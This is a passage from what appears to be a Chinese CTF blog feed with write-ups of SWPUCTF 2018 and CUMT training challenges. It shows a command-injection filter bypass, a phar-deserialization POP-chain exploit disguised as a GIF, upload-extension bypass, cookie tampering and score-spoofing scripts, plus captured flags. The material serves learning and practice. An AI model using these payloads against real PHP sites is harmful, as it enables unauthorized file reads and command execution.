class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$len = strlen($str_rand) <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;strlen($pass); $i++)&#123;</span><br><span class="line"><span class="keyword">if</span>($i&lt;=(<span class="number">15</span>/<span class="number">2</span>))&#123;</span><br><span class="line">$number = strpos($str_rand,$pass[i]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$number $number 0 $len"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$number = $len + <span class="number">1</span> - strpos($str_rand,$pass[i]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$number $number 0 $len"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>这样可以得到我们爆破的种子</p><p><img src="/2018/12/20/SWPUCTF2018/1.png" alt></p><p>然后用该种子来生成24位的优惠码（这儿当时想不通哪来的24位，原来就是把代码中长度15改为24就可以了Orz）,此时注意php版本不同的话相同的种子也会产生不同的序列，看网站响应头可知该网站php版本为7.2，所以用对应版本生成优惠码即可</p><p>然后就是后半段的命令执行绕过了</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//support</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">               <span class="comment">//执行命令</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//flag字段和某些字符被过滤!</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// 你的输入不正确!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>对于第一个首尾匹配直接 <code>%0a</code> 换行即可绕过，第二个过滤了通配符，flag字段，可以用单引号绕过，cat命令不能用了就用tail命令即可</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip&#x3D;1.1.1.1%0atail &#x2F;&#39;fl&#39;ag</span><br></pre></td></tr></table></div></figure><p>方方土学长用的是<code>\</code>绕过，原理是反斜杠会转义特殊字符，而如果字符不是shell特殊字符的话则不转义</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip&#x3D;1.1.1.1%0atail &#x2F;fl\ag</span><br></pre></td></tr></table></div></figure>        <h2 id="SimplePHP">          <a href="#SimplePHP" class="heading-link"><i class="fas fa-link"></i></a>SimplePHP</h2>      <p>查看文件出存在文件读取漏洞，利用该漏洞读取文件源码，</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.158.180:11115/file.php?file=index.php</span><br></pre></td></tr></table></div></figure><p>关键源码如下</p><p>function.php</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"base.php"</span>; </span><br><span class="line">header(<span class="string">"Content-type: text/html;charset=utf-8"</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">".jpg"</span>; </span><br><span class="line">    <span class="comment">//mkdir("upload",0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"upload/"</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>); </span><br><span class="line">    $temp = explode(<span class="string">"."</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>file.php</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>; </span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>class.php</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>看到出现了类，思路就基本上是php反序列化了，但是代码中并没有反序列化函数的调用，但是在file.php中看到存在file_exists()函数，该函数是可以通过phar协议实现反序列化的<span class="exturl"><a class="exturl__link" href="https://www.freebuf.com/company-information/187071.html" target="_blank" rel="noopener">参考文章</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，接下里的思路就是构造pop链，题目中有提示 <code>&lt;!--flag is in f1ag.php--&gt;</code> ，所以要尝试读取f1ag.php文件</p><p>在Show类的<strong>show方法中过滤了f1ag字段，那么这个方法应该不行，看了大佬的pop链构造思路，Test类中有file_get_contents()函数可以读取文件内容，所以可以尝试反序列化Test类，file_get()方法被get方法调用，而get方法是被</strong>get()魔术方法调用</p><blockquote><p> 当读取不可访问属性的值时，__get() 会被调用。也就是，当想要获取一个类的私有属性，或者获取一个类并为定义的属性时。该魔术方法会被调用。 </p></blockquote><p>可以看到我们需要访问一个不可访问的变量，在Show中的<strong>toString()方法中，运行了 <code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source;</code>，该语句会访问不存在的变量source，所以接下来就是要触发</strong>toString()方法，正好在C1e4r类中<strong>destruct()类中 <code>echo $this-&gt;test;</code> 则会触发</strong>toString()方法，至此pop链构造完成:</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.C1e4r类的__destruct()中的echo $this-&gt;test;</span><br><span class="line">2.Show中的__toString()中的$content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;</span><br><span class="line">3.Test中的__get()方法</span><br><span class="line">4.利用file_get_contens()读文件</span><br></pre></td></tr></table></div></figure><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;params = <span class="keyword">array</span>(<span class="string">"source"</span>=&gt;<span class="string">'/var/www/html/f1ag.php'</span>);</span><br><span class="line">$b = <span class="keyword">new</span> Show(<span class="string">'index.php'</span>);</span><br><span class="line">$b-&gt;str[<span class="string">'str'</span>] = $a;</span><br><span class="line">$c= <span class="keyword">new</span> C1e4r($b);</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line">$obj = unserialize(<span class="string">'O:5:"C1e4r":2:&#123;s:4:"test";N;s:3:"str";O:4:"Show":2:&#123;s:6:"source";s:9:"index.php";s:3:"str";a:1:&#123;s:3:"str";O:4:"Test":2:&#123;s:4:"file";N;s:6:"params";a:1:&#123;s:6:"source";s:22:"/var/www/html/f1ag.php";&#125;&#125;&#125;&#125;&#125;'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exploit.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.php'</span>, <span class="string">'test'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class="line">$phar-&gt;setMetadata($obj);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'exploit.phar'</span>, <span class="string">'skyfuck.gif'</span>);</span><br></pre></td></tr></table></div></figure><p>然后提交即可</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;upload&#x2F;680b7502eaac53cac3f3eca74d50f537.jpg</span><br></pre></td></tr></table></div></figure><!-- SWPUCTF{Php_un$eri4liz3_1s_Fu^!} -->]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目复现&lt;/p&gt;
    
    </summary>
    
      <category term="复现" scheme="http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
      <category term="Web" scheme="http://chaosec.top/tags/Web/"/>
    
      <category term="Misc" scheme="http://chaosec.top/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>CUMT网络安全实训平台题目记录</title>
    <link href="http://chaosec.top/2018/12/07/cumtctf/"/>
    <id>http://chaosec.top/2018/12/07/cumtctf/</id>
    <published>2018-12-07T15:55:48.000Z</published>
    <updated>2019-01-31T04:28:04.010Z</updated>
    
    <content type="html"><![CDATA[<p>CUMT网络安全实训平台题目记录</p><a id="more"></a>        <h1 id="WEB">          <a href="#WEB" class="heading-link"><i class="fas fa-link"></i></a>WEB</h1>              <h2 id="源代码">          <a href="#源代码" class="heading-link"><i class="fas fa-link"></i></a>源代码</h2>      <p>查看源代码，在最后发现一段字符</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--该f配l合a你g演&#123;出y的o我u演f视i而n不d见m别e逼2一3个3最3爱3你3的3人3即3兴3表3演&#125;--&gt;</span><br></pre></td></tr></table></div></figure><p>提取出字符即可得到flag</p>        <h2 id="colorSnake">          <a href="#colorSnake" class="heading-link"><i class="fas fa-link"></i></a>colorSnake</h2>      <p>前端题目，一头雾水，看了别人的wp，查看源代码在页面地段可以看到有一个game.js，跟过去看一下，</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xhr(<span class="string">'./getScore.php'</span>,function(e)&#123;</span><br><span class="line">                <span class="keyword">var</span> r = JSON.parse(e);</span><br><span class="line">                <span class="keyword">if</span>(r.state == <span class="number">200</span>)</span><br><span class="line">                    game.addScore(r.score);</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    alert(r.msg);</span><br><span class="line">                    game.start()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br></pre></td></tr></table></div></figure><p>尝试在控制台提交</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setInterval(function()&#123;xhr(&#39;.&#x2F;getScore.php&#39;,function(e)&#123;</span><br><span class="line">                var r &#x3D; JSON.parse(e);</span><br><span class="line">                if(r.state &#x3D;&#x3D; 200)</span><br><span class="line">                    game.addScore(r.score);</span><br><span class="line">                else&#123;</span><br><span class="line">                    alert(r.msg);</span><br><span class="line">                    game.start()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)&#125;,1)</span><br></pre></td></tr></table></div></figure><p>会发现id确实增加了，我们可以通过修改参数使它实现多次递增从而达到50分，最终payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setInterval(function()&#123;xhr(&#39;.&#x2F;getScore.php&#39;,function(e)&#123;</span><br><span class="line">                var r &#x3D; JSON.parse(e);</span><br><span class="line">                if(r.state &#x3D;&#x3D; 200)</span><br><span class="line">                    game.addScore(r.score);</span><br><span class="line">                else&#123;</span><br><span class="line">                    alert(r.msg);</span><br><span class="line">                    game.start()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)&#125;,1000)</span><br></pre></td></tr></table></div></figure>        <h2 id="备份">          <a href="#备份" class="heading-link"><i class="fas fa-link"></i></a>备份</h2>      <p>题目给出了信息</p><blockquote><p>1.bak 2.bak There are too much baks in the website ,can you find the flag in these baks?</p></blockquote><p>尝试访问1.bak，2.bak，没有发现flag，继续访问3.bak，4.bak等都存在文件，只是没有flag，猜测flag应该在某个*.bak，中，bp爆破一下，在998.bak中发现了flag</p>        <h2 id="上传一">          <a href="#上传一" class="heading-link"><i class="fas fa-link"></i></a>上传一</h2>      <p>题目要求上传jpg后缀，写一个PHP文件修改后缀为jpg，之后抓包修改文件名后缀为PHP再发包（因为它是在前端验证文件是否合法）</p><p><img src="/2018/12/07/cumtctf/2.png" alt="payload"></p><p>之后就可以惊喜的看到本题的flag和下个“上传2”题目的flag（2333..）</p><p><img src="/2018/12/07/cumtctf/3.png" alt="result"></p>        <h2 id="自动获取flag程序">          <a href="#自动获取flag程序" class="heading-link"><i class="fas fa-link"></i></a>自动获取flag程序</h2>      <p>题目说了要修改一下程序，查看源代码</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求参数一</span></span><br><span class="line">$(<span class="string">"#a"</span>).click(function()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">'param1.php'</span>,</span><br><span class="line">        method:<span class="string">'get'</span>,</span><br><span class="line">        dataType:<span class="string">'json'</span>,</span><br><span class="line">        success:calParam2</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function">function <span class="title">calParam2</span><span class="params">(d)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> data=JSON.parse((d.param));</span><br><span class="line">    <span class="keyword">var</span> length=data.length;</span><br><span class="line">    <span class="keyword">var</span> second=<span class="keyword">new</span> Date().getSeconds();</span><br><span class="line">    <span class="keyword">var</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; length/<span class="number">2</span>; j++) &#123;</span><br><span class="line">            sum+=parseInt(data[i])*second + data[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 请求flag</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">'http://new.ctf.param.com/aram2.php?sum='</span>+sum,</span><br><span class="line">        method:<span class="string">'get'</span>,</span><br><span class="line">        dataType:<span class="string">'json'</span>,</span><br><span class="line">        success:function(s)&#123;</span><br><span class="line">            alert(s.f);</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line">        error:function(s)&#123;</span><br><span class="line">            alert(<span class="string">'错了'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>看到有个param1.php的请求，访问一下得到</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;param&quot;:&quot;[&quot;1&quot;,&quot;6&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;9&quot;,&quot;1&quot;,&quot;10&quot;]&quot;&#125;</span><br></pre></td></tr></table></div></figure><!-- flag{hello,This is A Gift FoRm PHP&JS; O(∩_∩)O~} -->        <h2 id="Cookie？">          <a href="#Cookie？" class="heading-link"><i class="fas fa-link"></i></a>Cookie？</h2>      <p>查看cookie发现user值为guest，改为admin再刷新即可</p><p><img src="/2018/12/07/cumtctf/5.png" alt="result"></p><p>一看就是维吉尼亚密码，解密一下就可以了</p><!-- flag{thisisanoldencrypt}<-->        <h2 id="上传二">          <a href="#上传二" class="heading-link"><i class="fas fa-link"></i></a>上传二</h2>      <p>见上传一</p>        <h2 id="logic">          <a href="#logic" class="heading-link"><i class="fas fa-link"></i></a>logic</h2>      <p>查看源代码可以发现</p><p><img src="/2018/12/07/cumtctf/1.png" alt></p><p>应该是存在vim泄漏，尝试访问 <code>submit.php.swp</code> 发现泄漏文件，关键代码如下</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span 